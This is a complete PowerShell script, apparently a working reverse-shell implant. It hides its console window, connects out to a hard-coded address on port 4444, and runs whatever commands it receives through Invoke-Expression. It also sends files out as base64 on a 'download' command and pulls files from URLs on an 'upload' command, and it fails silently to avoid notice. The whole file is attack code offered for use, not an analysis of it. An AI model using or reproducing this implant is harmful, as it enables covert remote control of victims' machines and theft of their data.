# full.ps1 - Fixed version with proper network output
$ip = "192.168.150.2"
$port = 4444

# Hide window
Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
"@ -Namespace Win32Functions -Name NativeMethods -ErrorAction SilentlyContinue

$consoleWindow = [Win32Functions.NativeMethods]::GetConsoleWindow() -ErrorAction SilentlyContinue
[Win32Functions.NativeMethods]::ShowWindowAsync($consoleWindow, 0) -ErrorAction SilentlyContinue

# File transfer function
function Send-File {
    param([string]$filePath)
    
    if (Test-Path $filePath) {
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $b64 = [Convert]::ToBase64String($bytes)
        $fileName = Split-Path $filePath -Leaf
        
        # Send to network, not local console
        $writer.WriteLine("FILE_START|$fileName|$($bytes.Length)")
        $writer.WriteLine($b64)
        $writer.WriteLine("FILE_END")
    } else {
        $writer.WriteLine("ERROR|File not found: $filePath")
    }
    $writer.Flush()
}

# Main loop
try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true  # CRITICAL: sends data immediately
    
    # Send ready message
    $writer.WriteLine("[+] Connected to $ip")
    
    while (($line = $reader.ReadLine()) -ne $null) {
        $line = $line.Trim()
        
        # Check for download command
        if ($line -match "^download (.+)$") {
            $filePath = $matches[1]
            Send-File $filePath
        }
        # Check for upload command
        elseif ($line -match "^upload (.+) (.+)$") {
            $url = $matches[1]
            $dest = $matches[2]
            try {
                $wc = New-Object System.Net.WebClient
                $wc.DownloadFile($url, $dest)
                $writer.WriteLine("SUCCESS|Downloaded to $dest")
            } catch {
                $writer.WriteLine("ERROR|$($_.Exception.Message)")
            }
        }
        # Normal command execution
        else {
            try {
                $output = Invoke-Expression $line 2>&1 | Out-String
                if ($output) {
                    $writer.WriteLine($output)
                } else {
                    $writer.WriteLine("[+] Command executed (no output)")
                }
            } catch {
                $writer.WriteLine("ERROR: $($_.Exception.Message)")
            }
        }
        $writer.Flush()
    }
} catch {
    # Silent fail
    exit
}